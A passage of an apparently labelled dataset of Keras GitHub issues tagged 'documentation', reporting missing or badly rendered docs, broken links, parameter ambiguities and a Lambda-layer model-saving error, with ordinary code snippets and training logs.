equipment:\r\nWIN10 v1903 \r\nR v3.5.1\r\nRStudio v1.2.1335\r\nkeras v2.2.0.9000 (via Anaconda environment)\r\ntensorflow v1.9\r\nreticulate v1.10\r\n"},{"labels":["documentation"],"text":"If the keras Library had links to examples on Google Colab it will save a lot of time of developers and new comers to the field of deep learning in understanding the code and implementing in with detailed description mentioned."},{"labels":["documentation"],"text":"The documentation for the patience parameter in the callback EarlyStopping/ReduceLROnPlateau may lead one to believe that training is stopped, whenever `patience` epochs have passed and some `quantity` has not improved.\r\n\r\nThis is not the case, when training with `model.fit(validation_freq=5)` and monitoring a validation quantity like `val_loss`. In that case, at least `5*patience` epochs have to pass, because only those epochs are counted that actually produce a `val_loss` value, i.e. every 5th one.\r\n\r\nOne could either change the implementation and count every epoch and not just the ones that produce the measured quantity or improve the documentation and make clear that only those epochs are counted that actually produce the monitored value.\r\n\r\nI'd prefer the latter, as it does not break existing code/expectations."},{"labels":["documentation"],"text":"Is it useful for many users to have some fully executed Jupyter notebooks with key examples and step-by-step explanation?\r\n\r\nFor example, I re-casted the transfer learning MNIST example with CIFAR-10 because, it shows the behavior of 'training on one set of images' and 'transferring the trained ability', more clearly.\r\n\r\nIn this type of illustrations, it is good to have actual images. Therefore, a notebook could be helpful.\r\n\r\nHere is my Notebook: [Transfer learning with CIFAR-10 tutorial example](https://github.com/tirthajyoti/Deep-learning-with-Python/blob/master/Notebooks/Transfer_learning_CIFAR.ipynb)"},{"labels":[null,"documentation",null],"text":"@fchollet Do you think a [focal loss](https://arxiv.org/pdf/1708.02002.pdf) is useful in keras? I've done implementation for my purpose (binary and categorical classification) and I can commit it to keras also.\r\n\r\nIf yes, I'll provide tests, documentation and so on."},{"labels":["documentation"],"text":"The keras Documntation shows evaluate_generator having argument callbacks ,But while im using it it isnt accepting the callbcaks argument.\r\n\r\nI'm using keras version: '2.2.4'\r\n\r\nevaluate_generator(generator, steps=None, callbacks=None, max_queue_size=10, workers=1, use_multiprocessing=False, verbose=0)\r\nhttps://keras.io/models/model/\r\n"},{"labels":[null,"documentation"],"text":"After visiting https://keras.io/preprocessing/text/ , I cannot find explaination for fit_on_texts (and other methods) under Tokenizer class.\r\nOn the other hand if I visit Japanese docs https://keras.io/ja/preprocessing/text/ , I can find the class and the methods listed as expected.\r\nIs it a bug or an expected behavior?\r\n"},{"labels":["documentation"],"text":"The [documentation for the embedding layer](https://keras.io/layers/embeddings/) specifies that the input should be an integer matrix. While the inputs should in fact be indices into the vocabulary (non-negative integers), they need to be cast as floats. If an integer-type matrix is input, the training does not work right, without ever giving an error, which is very hard to debug.\r\n\r\nSuggestions:\r\n- At minimum, update the documentation to specify that the input should be round numbers cast as floats.\r\n- Maybe also check the input for this and all other layers and raise an error if the type is wrong.\r\n- Maybe cast the inputs to floats within the `fit`, `predict`, and other relevant functions.\r\n\r\nI may be able to try taking a stab at this, if you tell me which option you prefer. Thanks!\r\n\r\n\r\n- [x] Check that you are up-to-date with the master branch of Keras. You can update with:\r\npip install git+git://github.com/keras-team/keras.git --upgrade --no-deps\r\n\r\n- [x] If running on TensorFlow, check that you are up-to-date with the latest version. The installation instructions can be found [here](https://www.tensorflow.org/get_started/os_setup).\r\n\r\n- [x] If running on Theano, check that you are up-to-date with the master branch of Theano. You can update with:\r\npip install git+git://github.com/Theano/Theano.git --upgrade --no-deps\r\n\r\n- [x] Provide a link to a GitHub Gist of a Python script that can reproduce your issue (or just copy the script here if it is short).\r\n"},{"labels":["documentation"],"text":"In the Keras documentation, it says about the convLSTM2D activation parameter:\r\n\r\nactivation: Activation function to use (see activations). If you don't specify anything, no activation is applied (ie. \"linear\" activation: a(x) = x).\r\n\r\nbut in the code I see that the default activation is NOT linear:\r\nactivation='tanh'"},{"labels":[null,"documentation"],"text":"<em>Please make sure that this is a Bug or a Feature Request and provide all applicable information asked by the template.\r\nIf your issue is an **implementation question**, please ask your question on [StackOverflow](http://stackoverflow.com/questions/tagged/keras) or [on the Keras Slack channel](https://keras-slack-autojoin.herokuapp.com/) instead of opening a GitHub issue.</em>  \r\n\r\n**System information**  \r\n- Have I written custom code (as opposed to using example directory):  \r\n- OS Platform and Distribution (e.g., Linux Ubuntu 16.04):  \r\n- TensorFlow backend (yes / no):  yes\r\n- TensorFlow version:  latest update\r\n- Keras version:  up to date\r\n- Python version:  up to date\r\n- CUDA/cuDNN version:  -\r\n- GPU model and memory: - \r\n\r\nThe keras.io has no documentation on the Generative Adversial Network and No examples too, I guess there should be an section for this too"},{"labels":["documentation"],"text":"There is an issue as title. There supposed to show sub items on the pages. \r\n<img width=\"305\" alt=\"Screen Shot 2019-04-25 at 3 52 46 PM\" src=\"https://user-images.githubusercontent.com/41447049/56773256-3aaf2400-6772-11e9-8e24-dcac1ad80432.png\">\r\n"},{"labels":["documentation"],"text":"There's no documentation for functions mentioned below in keras repo. It's there under keras pre-processing repo.\r\nFind the below functions under `keras/preprocessing/image.py`\r\n\r\n1. `array_to_img`\r\n2. `img_to_array`\r\n3. `save_img`\r\n\r\nThank you!"},{"labels":[null,"documentation"],"text":"I have found the documentation for sample weights in multi-output models to be lacking. It does not tell you of the correct format to include sample weights in, for a multi-output model. \r\n\r\nWhile some trial-and-error helped me figure it out, it would've saved me and my collaborators some anguish if the documentation was clear beforehand.\r\n\r\nPlease add better documentation about this."},{"labels":[null,"documentation"],"text":"Am trying to do some testing of generic optimization capabilities. It feels like there is no reason a graph could not be optimized via a keras model that takes no inputs or outputs but simply takes a loss function and optimizer. \r\n\r\nI ended up in this rabbit hole trying out tf 2.0 and hitting issues doing the same there. Would be good to understand what is the intended workflow between the two in 2.0 for vanilla optimizations."},{"labels":["documentation"],"text":"There are many fixes on master that are not in the latest release (2.2.4, october 2018). Is it possible to push a new release? 2.3.0? Cheers."},{"labels":[null,"documentation"],"text":"This issue is identical to the https://github.com/keras-team/keras/issues/9642. \r\n\r\nThe documentation doesn't include dilation_rate for depthwise convolutions because it was not included as one of the keyword arguments. Instead dilation_rate is passed to _Conv() through **kwargs. Need to add dilation_rate explicitly to the keyword arguments. \r\nThe fix should be pretty straightforward, like https://github.com/keras-team/keras/pull/9844. \r\n\r\n- [+ ] Check that you are up-to-date with the master branch of Keras. You can update with:\r\n`pip install git+git://github.com/keras-team/keras.git --upgrade --no-deps`\r\n\r\n- [+ ] Check that your version of TensorFlow is up-to-date. The installation instructions can be found [here](https://www.tensorflow.org/get_started/os_setup).\r\n\r\n- [SKIP ] Provide a link to a GitHub Gist of a Python script that can reproduce your issue (or just copy the script here if it is short).\r\n"},{"labels":["documentation"],"text":"Please make sure that the boxes below are checked before you submit your issue.\r\nIf your issue is an **implementation question**, please ask your question on [StackOverflow](http://stackoverflow.com/questions/tagged/keras) or [on the Keras Slack channel](https://keras-slack-autojoin.herokuapp.com/) instead of opening a GitHub issue.\r\n\r\nThank you!\r\n\r\n- [. ] Check that you are up-to-date with the master branch of Keras. You can update with:\r\n`pip install git+git://github.com/keras-team/keras.git --upgrade --no-deps`\r\n\r\n- [ .] Check that your version of TensorFlow is up-to-date. The installation instructions can be found [here](https://www.tensorflow.org/get_started/os_setup).\r\n\r\n- [ ] Provide a link to a GitHub Gist of a Python script that can reproduce your issue (or just copy the script here if it is short).\r\n\r\nI believe there should be a documentation on\r\nhttps://keras.io\r\nfor letting beginners understand Transfer learning, I spent an entire day figuring out how to do this and i guess many people may have spend months doing this. This stuff reduces time to train and make predictions \r\n\r\nThe documentation at \r\nhttps://keras.io/applications/\r\nis not much clear and needs to be improved for instance there should be and indication upon what needs to be feeded in certain parts of the program and how can one use it using his or her own datasets\r\n"},{"labels":[null,"documentation"],"text":"In the docs section: https://keras.io/getting-started/functional-api-guide/#multi-input-and-multi-output-models\r\n\r\nThe example is either incomplete or wrong. The following complete example that generates data fails. Examples, should be complete with random data.\r\n```\r\n\r\nimport numpy as np\r\nfrom tensorflow import keras \r\nfrom tensorflow.keras.layers import Input, Embedding, LSTM, Dense\r\nfrom tensorflow.keras.models import Model\r\n\r\n# Headline input: meant to receive sequences of 100 integers, between 1 and 10000.\r\n# Note that we can name any layer by passing it a \"name\" argument.\r\nmain_input = Input(shape=(100,), dtype='float32', name='main_input')\r\n\r\n# This embedding layer will encode the input sequence\r\n# into a sequence of dense 512-dimensional vectors.\r\nx = Embedding(output_dim=512, input_dim=10000, input_length=100)(main_input)\r\n\r\n# A LSTM will transform the vector sequence into a single vector,\r\n# containing information about the entire sequence\r\nlstm_out = LSTM(32)(x)\r\nauxiliary_output = Dense(1, activation='sigmoid', name='aux_output')(lstm_out)\r\n\r\nauxiliary_input = Input(shape=(5,), name='aux_input')\r\nx = keras.layers.concatenate([lstm_out, auxiliary_input])\r\n\r\n# We stack a deep densely-connected network on top\r\nx = Dense(64, activation='relu')(x)\r\nx = Dense(64, activation='relu')(x)\r\nx = Dense(64, activation='relu')(x)\r\n\r\n# And finally we add the main logistic regression layer\r\nmain_output = Dense(1, activation='sigmoid', name='main_output')(x)\r\n\r\nmodel = Model(inputs=[main_input, auxiliary_input], outputs=[main_output, auxiliary_output])\r\n\r\nX = np.random.randn(12, 100)\r\nZ = np.random.randn(1, 5, 1)\r\n\r\nmodel.predict({'main_input': X, 'aux_input': Z})\r\n```\r\n\r\nValueError: Error when checking input: expected aux_input to have 2 dimensions, but got array with shape (1, 5, 1)\r\n\r\nI can update the docs if someone knows the correction.\r\n"},{"labels":["documentation"],"text":"#12252 has already been merged, but the changes are not reflected in https://keras.io/examples/conv_filter_visualization/"},{"labels":["documentation"],"text":"Last release was 5 months ago. \r\n\r\nCan you release at least minor versions?"},{"labels":["documentation"],"text":"Please make sure that the boxes below are checked before you submit your issue. If your issue is an implementation question, please ask your question on [StackOverflow](http://stackoverflow.com/questions/tagged/keras) or [join the Keras Slack channel](https://keras-slack-autojoin.herokuapp.com/) and ask there instead of filing a GitHub issue.\r\n\r\nThank you!\r\n\r\n- [x] Check that you are up-to-date with the master branch of Keras. You can update with:\r\npip install git+git://github.com/keras-team/keras.git --upgrade --no-deps\r\n\r\n- [x] If running on TensorFlow, check that you are up-to-date with the latest version. The installation instructions can be found [here](https://www.tensorflow.org/get_started/os_setup).\r\n\r\n- [x] If running on Theano, check that you are up-to-date with the master branch of Theano. You can update with:\r\npip install git+git://github.com/Theano/Theano.git --upgrade --no-deps\r\n\r\n- [x] Provide a link to a GitHub Gist of a Python script that can reproduce your issue (or just copy the script here if it is short).\r\n"},{"labels":[null,"documentation"],"text":"It's great to see half-precision is now supported. Are there any plans to support mixed precision as detailed, for example, [here](https://forums.fast.ai/t/mixed-precision-training/20720)?\r\n"},{"labels":[null,null,"documentation"],"text":" (e.g. for links and images), because some of these examples are now being rendered in the docs.\r\n\r\nAdded by @fchollet in requests for contributions. "},{"labels":[null,null,"documentation"],"text":"\r\n![image](https://user-images.githubusercontent.com/29904255/52306796-e791b600-2966-11e9-82eb-84c1df397683.png)\r\nPlease make sure that the boxes below are checked before you submit your issue.\r\nIf your issue is an **implementation question**, please ask your question on [StackOverflow](http://stackoverflow.com/questions/tagged/keras) or [on the Keras Slack channel](https://keras-slack-autojoin.herokuapp.com/) instead of opening a GitHub issue.\r\n\r\nThank you!\r\n\r\n- [ ] Check that you are up-to-date with the master branch of Keras. You can update with:\r\n`pip install git+git://github.com/keras-team/keras.git --upgrade --no-deps`\r\n\r\n- [ ] Check that your version of TensorFlow is up-to-date. The installation instructions can be found [here](https://www.tensorflow.org/get_started/os_setup).\r\n\r\n- [ ] Provide a link to a GitHub Gist of a Python script that can reproduce your issue (or just copy the script here if it is short).\r\n"},{"labels":[null,null,"documentation"],"text":"In Reuters dataset, there are 11228 instances while in the [dataset's webpage](https://archive.ics.uci.edu/ml/datasets/reuters-21578+text+categorization+collection) there are 21578. Even in the [reference paper](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.39.3129&rep=rep1&type=pdf) there are more than 11228 examples after pruning. \r\n\r\nUnfortunately, there is no information about the Reuters dataset in Keras documentation. Is it possible to clarify how this dataset gathered and what the topics labels are? It mentioned there are 46 topics but what is the category e.g. for topic number 32?"},{"labels":[null,null,"documentation"],"text":"Please make sure that the boxes below are checked before you submit your issue.\r\nIf your issue is an **implementation question**, please ask your question on [StackOverflow](http://stackoverflow.com/questions/tagged/keras) or [on the Keras Slack channel](https://keras-slack-autojoin.herokuapp.com/) instead of opening a GitHub issue.\r\n\r\nThank you!\r\n\r\n- [NA ] Check that you are up-to-date with the master branch of Keras. You can update with:\r\n`pip install git+git://github.com/keras-team/keras.git --upgrade --no-deps`\r\n\r\n- [ NA] Check that your version of TensorFlow is up-to-date. The installation instructions can be found [here](https://www.tensorflow.org/get_started/os_setup).\r\n\r\n- [NA ] Provide a link to a GitHub Gist of a Python script that can reproduce your issue (or just copy the script here if it is short).\r\n\r\nThe documentation for flow_from_directory() has a spelling error. Under arguments, 'rgb' is misspelled as  'rbg':\r\n\r\ncolor_mode: One of \"grayscale\", \"rbg\", \"rgba\". Default: \"rgb\". Whether the images will be converted to have 1, 3, or 4 channels."},{"labels":[null,null,"documentation"],"text":"This is very minor, but the second link used as reference in Conv2DTranspose seems to be invalid. \r\nIt can be changed from https://www.matthewzeiler.com/pubs/cvpr2010/cvpr2010.pdf to https://www.matthewzeiler.com/mattzeiler/deconvolutionalnetworks.pdf."},{"labels":[null,"documentation"],"text":"On the Keras documentation we find the following information for **steps_per_epoch** and **validation_steps** when using the fit_generator() function:\r\n\r\n> It should typically be equal to the number of samples of your validation dataset divided by the batch size.\r\n\r\nI'm writing a [new generator](https://gist.github.com/kleysonr/a41f0d72891afec8a49990c8cc24f5e4) and while debugging my code I didn't get the full dataset that was expected for one epoch.\r\n\r\nBelow my fit_generator:\r\n\r\n```python\r\nkbg = KerasBatchGenerator('/home/kleysonr/Downloads/keras-generator/dataset', batch_size=6, imagesize=(100, 100), test_ratio=0.3)\r\n\r\nmodel.fit_generator(kbg.generate(set='train'), \r\n                    steps_per_epoch=training_steps,\r\n                    epochs=1,\r\n                    verbose=1,\r\n                    validation_data=kbg.generate(set='test'),\r\n                    validation_steps=validation_steps,\r\n                    use_multiprocessing=False,\r\n                    workers=0)\r\n\r\n```\r\n\r\nSetting steps_per_epoch and validation_steps, as:\r\n\r\n```python\r\ntraining_steps = kbg.getTrainingSize() // kbg.getBatchSize()\r\nvalidation_steps = kbg.getTestingSize() // kbg.getBatchSize()\r\n```\r\n\r\nThe batch process was (missing 3 images for the full training dataset):\r\n\r\n```\r\nEpoch 1/1\r\nBatch: 0-0 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-10.jpg\r\nBatch: 0-1 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-2.jpg\r\nBatch: 0-2 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-1.jpg\r\nBatch: 0-3 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-2.jpg\r\nBatch: 0-4 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-2.jpg\r\nBatch: 0-5 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-9.jpg\r\n1/3 [=========>....................] - ETA: 1s - loss: 1.1116 - acc: 0.1667\r\nBatch: 1-0 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-8.jpg\r\nBatch: 1-1 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-7.jpg\r\nBatch: 1-2 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-8.jpg\r\nBatch: 1-3 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-9.jpg\r\nBatch: 1-4 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-1.jpg\r\nBatch: 1-5 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-6.jpg\r\n2/3 [===================>..........] - ETA: 0s - loss: 1.1519 - acc: 0.1667\r\nBatch: 2-0 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-9.jpg\r\nBatch: 2-1 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-4.jpg\r\nBatch: 2-2 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-5.jpg\r\nBatch: 2-3 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-6.jpg\r\nBatch: 2-4 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-10.jpg\r\nBatch: 2-5 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-1.jpg\r\n3/3 [==============================] - 1s 392ms/step - loss: 1.1632 - acc: 0.2222 - val_loss: 1.0733 - val_acc: 0.3333\r\n```\r\n\r\nSetting steps_per_epoch and validation_steps, as:\r\n\r\n```python\r\ntraining_steps = math.ceil(kbg.getTrainingSize() / kbg.getBatchSize())\r\nvalidation_steps = math.ceil(kbg.getTestingSize() / kbg.getBatchSize())\r\n```\r\n\r\nThe batch process was (got the full training dataset):\r\n\r\n```\r\nEpoch 1/1\r\nBatch: 0-0 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-6.jpg\r\nBatch: 0-1 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-1.jpg\r\nBatch: 0-2 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-2.jpg\r\nBatch: 0-3 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-5.jpg\r\nBatch: 0-4 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-5.jpg\r\nBatch: 0-5 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-9.jpg\r\n1/4 [======>.......................] - ETA: 3s - loss: 1.1336 - acc: 0.1667\r\nBatch: 1-0 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-9.jpg\r\nBatch: 1-1 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-9.jpg\r\nBatch: 1-2 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-6.jpg\r\nBatch: 1-3 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-4.jpg\r\nBatch: 1-4 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-10.jpg\r\nBatch: 1-5 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-7.jpg\r\n2/4 [==============>...............] - ETA: 1s - loss: 1.1540 - acc: 0.1667\r\nBatch: 2-0 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-3.jpg\r\nBatch: 2-1 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-3.jpg\r\nBatch: 2-2 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-3.jpg\r\nBatch: 2-3 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-10.jpg\r\nBatch: 2-4 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-6.jpg\r\nBatch: 2-5 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-8.jpg\r\n3/4 [=====================>........] - ETA: 0s - loss: 1.3066 - acc: 0.2222\r\nBatch: 3-0 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class3/c3-1.jpg\r\nBatch: 3-1 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class1/c1-7.jpg\r\nBatch: 3-2 <<train>> /home/kleysonr/Downloads/keras-generator/dataset/class2/c2-10.jpg\r\n1544964579 --train-- New epoch\r\n4/4 [==============================] - 2s 391ms/step - loss: 1.2351 - acc: 0.3238 - val_loss: 1.1089 - val_acc: 0.2222\r\n```\r\n\r\nIs the second approach - using math.ceil() - the correct way to set the parameters ?\r\nIf yes, I'm wondering if the documentation could be more clear about setting those parameters.\r\n\r\nBelow more useful information:\r\n\r\n```\r\nInformation about dataset:\r\n  Dataset size: 30\r\n  Training size: 21\r\n  Test size: 9\r\n  Classes: 3\r\n  Batch Size: 6\r\n```\r\n```\r\n$ pip3 freeze | egrep \"Keras|tensorflow\"\r\nKeras==2.2.4\r\nKeras-Applications==1.0.6\r\nKeras-Preprocessing==1.0.5\r\ntensorflow-gpu==1.12.0\r\n```\r\n```\r\n$ python3 --version\r\nPython 3.5.2\r\n```\r\n\r\nBest Regards.\r\nKleyson Rios."},{"labels":[null,null,"documentation"],"text":"flow_from_dataframe is a very useful function allowing flexibility that flow_from_directory lacks, for e.g, regression tasks.\r\nBut the problem with this function is it processes the dataframe's (filename) column in sorted way.\r\nfor example\r\nfilename  y\r\na              3.2\r\nd              2.2\r\nc               5.2\r\n\r\nin principle, the generator should process files in this way:\r\na,d,c\r\nbut the current implementation processes file in alphabtic order\r\na,c,d\r\n\r\nthis is not so convenient for predict_generator function"},{"labels":["documentation"],"text":"The link \"Edit on Github\" in the upper right corner of the keras.io documentation is broken and leads to a 404 error page. \r\n\r\nThis is an example of the current link:\r\nhttps://github.com/keras-team/keras/edit/master/docs/index.md\r\n\r\nI guess it should be:\r\nhttps://github.com/keras-team/keras/tree/master/docs \r\n\r\nThis is the same for all links on keras.io."},{"labels":["documentation"],"text":"Are you going to comment each line of code in Keras?  When is this going to happen along with detailed jupyter notebooks with tutorials?  The current stuff on the website is not linear and is missing tons of information.\r\n"},{"labels":["documentation"],"text":"While searching for Keras Callbacks, I found the link as below:\r\n\r\nhttps://keras.io/callbacks/.\r\n\r\nThere, the Arugments for every callbacks is described with couple of sentences. \r\nEspecially The Arguments description for  ModelCheckpoint,Tensorboard is specified with paragraphs. \r\n\r\nIt would be better , if sufficient new lines are added so that the document gives better readability. \r\n\r\nThanks"},{"labels":[null,"documentation"],"text":"DepthwiseConv2D is not listed in the documentation (https://keras.io/layers/convolutional/)"},{"labels":[null,"documentation"],"text":"The current [documentation on callbacks](https://keras.io/callbacks/) isn't showing bullet points correctly under the \"Arguments\" section of a few models. Here's the example for `ModelCheckpoint`:\r\n\r\n> filepath: string, path to save the model file. monitor: quantity to monitor. verbose: verbosity mode, 0 or 1. save_best_only: if save_best_only=True, the latest best model according to the quantity monitored will not be overwritten. mode: one of {auto, min, max}. If save_best_only=True, the decision to overwrite the current save file is made based on either the maximization or the minimization of the monitored quantity. For val_acc, this should be max, for val_loss this should be min, etc. In auto mode, the direction is automatically inferred from the name of the monitored quantity. save_weights_only: if True, then only the model's weights will be saved (model.save_weights(filepath)), else the full model is saved (model.save(filepath)). period: Interval (number of epochs) between checkpoints.\r\n\r\nLooking at the source code, the docstring seems to be organized correctly:\r\nhttps://github.com/keras-team/keras/blob/dc9e510192d0a8a6f6943cd46e9554364d4dcdd2/keras/callbacks.py#L371-L390\r\n\r\nIt is however showing up correctly for other models, e.g. `ProgbarLogger`:\r\n\r\n> # Arguments\r\n> * __count_mode:__ One of \"steps\" or \"samples\". Whether the progress bar should count samples seen or steps (batches) seen.\r\n> * __stateful_metrics:__ Iterable of string names of metrics that should not be averaged over an epoch. Metrics in this list will be logged as-is. All others will be averaged over time (e.g. loss, etc)."},{"labels":[null,null,"documentation"],"text":"The documentation is badly rendered for flow_from_dataframe. See https://keras.io/preprocessing/image/.\r\nThis needs to be modified in `keras-team/preprocessing` in this file: https://github.com/keras-team/keras-preprocessing/blob/052eb78390f91bb1628c59a8b678324f68f9a2b4/keras_preprocessing/image.py\r\n\r\nAlso, a link is given as plain string it would be nice to have it as a hyperlink so that users can click on it.\r\n\r\nTo be clear, the pull request fixing this should not be opened on this repo, but on this repo: https://github.com/keras-team/keras-preprocessing"},{"labels":[null,"documentation"],"text":"In keras, it's possible to load other backends than tensorflow, theano or CNTK. Let's suppose there is a python file called `mxnet_backend.py` (for example), it's possible to load it as a backend by doing \"backend\" : \"mxnet_backend\" in keras.json.\r\n\r\nSee this file for more info: https://github.com/keras-team/keras/blob/161f0a876db4f8aa9d57161c13d366f081369601/keras/backend/__init__.py#L91 \r\n\r\nThis should be documented there: https://keras.io/backend/#switching-from-one-backend-to-another"},{"labels":[null,null,"documentation"],"text":"https://keras.io/constraints/ is badly rendered. There is a lot of text missing. This can come from one of those two things:\r\n\r\nThe file https://github.com/keras-team/keras/blob/master/docs/autogen.py which is responsible for grabbing the docstrings and making a markdown file.\r\n\r\nThe file https://github.com/keras-team/keras/blob/master/keras/constraints.py if something has a strange syntax.\r\n\r\nActually it is also possible to use git bisect (magical tool, incredibly useful) to pinpoint which commit broke this page in the documentation. This is a good opportunity to learn how to use it. Once we know which commit broke the page, it will be easy to find out how to fix it. To learn how to use git bisect, see https://www.metaltoad.com/blog/beginners-guide-git-bisect-process-elimination ."},{"labels":[null,null,"documentation"],"text":"In the documentation, it happens that the references are rendered as plain text instead of a hyperlink. \r\n\r\nSee here a case where it's wrong and rendered as plain text: https://keras.io/layers/advanced-activations/#leakyrelu . Displayed like this: `[Rectifier Nonlinearities Improve Neural Network Acoustic Models] (https://ai.stanford.edu/~amaas/papers/relu_hybrid_icml2013_final.pdf)`\r\n\r\nSee here the case where it's nicely rendered as a hyperlink: https://keras.io/layers/advanced-activations/#prelu\r\n\r\nIt's likely something easy to fix, like a space/newline at the wrong place or something like that. If somebody could fix all those broken references (there are more than one broken in the docs), it'd be cool."},{"labels":[null,null,"documentation"],"text":"In the Keras documentation for `multi_gpu_model`, it is stated:\r\n\r\n> To save the multi-gpu model, use .save(fname) or .save_weights(fname) with the template model (the argument you passed to multi_gpu_model), rather than the model returned by multi_gpu_model.\r\n\r\nHowever in example 2 the template model is overwritten by the multi-gpu model:\r\n\r\n```python\r\n         ..\r\n         # Not needed to change the device scope for model definition:\r\n         model = Xception(weights=None, ..)\r\n         try:\r\n             model = multi_gpu_model(model, cpu_relocation=True)\r\n             print(\"Training using multiple GPUs..\")\r\n         except:\r\n             print(\"Training using single GPU or CPU..\")\r\n         model.compile(..)\r\n         ..\r\n```\r\n\r\nThis means that in this example it would not be possible to save the weights of the template model. I suggest rewritting to something like:\r\n\r\n\r\n```python\r\n         ..\r\n         # Not needed to change the device scope for model definition:\r\n         model = Xception(weights=None, ..)\r\n         try:\r\n             parallel_model = multi_gpu_model(model, cpu_relocation=True)\r\n             print(\"Training using multiple GPUs..\")\r\n         except ValueError:\r\n             parallel_model = model\r\n             print(\"Training using single GPU or CPU..\")\r\n         parallel_model.compile(..)\r\n         ..\r\n```\r\n\r\n(I take this opportunity to except only a specific error)\r\n"},{"labels":[null,null,"documentation"],"text":"Some examples of usage of `multi_gpu_model` appear on the documentation of the function in the [source code](https://github.com/keras-team/keras/blob/master/keras/utils/multi_gpu_utils.py).  However they do not display correctly on the [Keras home page](https://keras.io/utils/):\r\n\r\n```Example 1 - Training models with weights merge on CPU\r\n\r\n$Example_2_-_Training_models_with_weights_merge_on_CPU_using_cpu_relocation$0\r\n\r\nExample 2 - Training models with weights merge on CPU using cpu_relocation\r\n\r\n$Example_2_-_Training_models_with_weights_merge_on_CPU_using_cpu_relocation$1\r\n\r\nExample 3 - Training models with weights merge on GPU (recommended for NV-link)\r\n\r\n$Example_2_-_Training_models_with_weights_merge_on_CPU_using_cpu_relocation$2```"},{"labels":[null,"documentation"],"text":"The keras documentation lacks a page about all the features which make keras integrate well in Tensorflow workflows. Things that we would like to see in this page:\r\n\r\n* Using native TF optimizers\r\n* Using the dataset API and the input tensors.\r\n* How to get the tensorflow tensors out of a keras model\r\n* How to use `session.run` in keras\r\n* Using keras layers in a tensorflow graph\r\n* ... \r\n\r\nHelp would be appreciated. For examples of code, you can look in the keras test directory, all the functions which have the decorator `@pytest.mark.skipif(K.backend() != 'tensorflow') `\r\n\r\n@rohit-gupta "},{"labels":[null,null,"documentation"],"text":"Hi,\r\n\r\nI'm trying to save Keras model that contains Lambda layer for resizing image - \r\n\r\n```python\r\ndef resize_like(input_tensor, ref_tensor): \r\n    H, W = ref_tensor.get_shape()[1], ref_tensor.get_shape()[2]\r\n    return K.tf.image.resize_images(input_tensor, [H.value, W.value])\r\n\r\nx = _inverted_res_block(x, filters=320, alpha=alpha, stride=1, rate=4,\r\n                                expansion=6, block_id=16, skip_connection=False)  #x is 2D tensor object\r\n\r\nb4 = Lambda(resize_like, arguments={'ref_tensor': x})(b4)                 #b4 is 2D tensor object\r\n###some more operation here#####\r\nx = Lambda(resize_like, arguments={'ref_tensor': img_input})(x)           #img_input is 2D tensor object\r\n\r\nmodel = Model(inputs, x, name='model1')\r\nmodel.save(filePath, overwrite=True)\r\n```\r\n\r\n\r\nEach run I get one of those four errors - \r\n\r\n1)  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 297, in _reconstruct\r\n    state = deepcopy(state, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 155, in deepcopy\r\n    y = copier(x, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 243, in _deepcopy_dict\r\n    y[deepcopy(key, memo)] = deepcopy(value, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 174, in deepcopy\r\n    rv = reductor(4)\r\nTypeError: can't pickle SwigPyObject objects\r\n\r\n\r\n  2)File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 155, in deepcopy\r\n    y = copier(x, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 243, in _deepcopy_dict\r\n    y[deepcopy(key, memo)] = deepcopy(value, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 174, in deepcopy\r\n    rv = reductor(4)\r\nTypeError: cannot serialize '_io.TextIOWrapper' object\r\n\r\n  3)File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 155, in 